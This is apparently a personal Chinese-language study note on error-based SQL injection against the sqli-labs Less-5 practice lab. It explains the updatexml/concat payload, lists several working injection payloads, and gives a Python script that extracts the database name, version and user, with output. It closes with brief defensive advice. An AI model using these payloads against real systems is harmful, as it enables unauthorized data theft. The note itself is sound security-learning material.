# P1-03 报错盲注（Error-based SQL Injection）

> 日期：2026-10-13 ｜ 环境：sqli-labs Less-5（Docker，`localhost:8083`）｜ 前置：P1-01 布尔盲注、P1-02 时间盲注

## 一句话原理

当页面**会把数据库报错信息打印出来**时，故意构造一个会报错的 SQL，把想偷的数据塞进报错信息里 —— 数据库报错时就把数据"说漏嘴"了。一次请求拿一整串，无需逐位猜。

## 核心 payload 拆解

```sql
?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+
```

**第 1 层：`updatexml()` 的三个参数**

| 参数 | 正常用途 | 传的值 | 说明 |
|---|---|---|---|
| 参数1 | XML 文档 | `1` | 占位，反正会报错，没机会被用 |
| 参数2 | XPath 路径 | `concat(0x7e,(SELECT database()),0x7e)` | 关键，见下 |
| 参数3 | 新值 | `1` | 占位 |

**第 2 层：`concat()` 拼出 `~security~`**
- `concat()` = 字符串拼接
- `0x7e` = `~` 的十六进制（ASCII 126）。不用 `'~'` 是为避免引号嵌套麻烦，圈内惯例
- `(SELECT database())` = 子查询，返回库名

**第 3 层：为什么报错**
MySQL 把 `~security~` 当 XPath 解析，`~` 是 XPath 非法字符 → 报错：
`XPATH syntax error: '~security~'`。网站把报错原文打印到页面 → 数据到手。

> 同类函数：`extractvalue()` 也是靠非法 XPath 报错，思路完全一样。

## 实战（Less-5）

```
?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+  → XPATH syntax error: '~security~'
?id=1' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+
?id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --+
```

## 自动化：正则一把梭

报错注入不需要二分法 —— 数据整串躺在报错里，用正则直接抓：

```python
import requests, re

BASE = "http://localhost:8083/Less-5/"

def get_data(query):
    payload = f"1' AND updatexml(1,concat(0x7e,({query}),0x7e),1) -- "
    r = requests.get(BASE, params={"id": payload}, timeout=10)
    m = re.search(r"~(.+?)~", r.text)   # 在报错信息里找 ~数据~
    return m.group(1) if m else None

print("库名:", get_data("select database()"))
print("版本:", get_data("select version()"))
print("用户:", get_data("select user()"))
```

真实运行输出：

```
库名: security
版本: 5.5.44-0ubuntu0.14.04.1
用户: root@localhost
```

**读输出**：MySQL 5.5.44 是 2014 年的老版本（靶场故意用旧版，漏洞多）；`root@localhost` 是最高权限用户 —— 这意味着该注入点后续可尝试提权 / 写文件，SQLi to RCE 的前置条件之一。

### 正则速通（本课新学的 Python 技能）

正则 = 描述"字符串长什么样"的语言。`re.search(通缉令, 字符串)` 找第一个匹配，返回 Match 对象或 `None`。

| 符号 | 意思 |
|---|---|
| `~` | 字面量 `~`（我们包数据的标记） |
| `(...)` | 捕获组，`group(1)` 取第 1 组内容 |
| `.` | 任意一个字符（除换行） |
| `+` | 1 次或多次 |
| `?` | 非贪婪：到第一个闭合 `~` 就停（贪婪会吃到最后一个 `~`） |

`r"..."` 的 `r` = raw 原始字符串，反斜杠不转义，写正则的习惯动作。

### 踩坑：Markdown 把 `~hello~` 吃了

`~文字~` 在部分 Markdown 渲染器里是**下标语法**，波浪线会被吞掉。写文档/笔记时，波浪线务必放进代码块，或改用文字"波浪线"描述。

## 盲注三件套总结

|  | P1-01 布尔盲注 | P1-02 时间盲注 | P1-03 报错盲注 |
|---|---|---|---|
| 信号载体 | 页面显示 / 消失 | 响应慢 / 快 | 报错信息内容 |
| 适用场景 | 页面有差异 | 页面无差异 | 页面打印报错 |
| 提取方式 | 逐位二分猜 | 逐位二分猜 | 一次拿一整串 |
| 速度 | 中（~50 请求） | 慢（秒级/请求） | 快（1 请求 1 串） |
| 核心函数 | `length/ascii/substr` | `IF/SLEEP` | `updatexml/concat` |

**心法：按信号选武器** —— 先看页面给了什么信号（差异 / 时间 / 报错），再选对应的注入类型。报错被藏 → 降级时间盲注；页面有差异 → 布尔盲注最省事。

## 防御视角（一句话）

生产环境**永远不要把数据库报错原文暴露给用户**（统一返回"系统繁忙"之类），这是挡住报错注入成本最低的一招；根治仍是预编译 / 参数化查询。
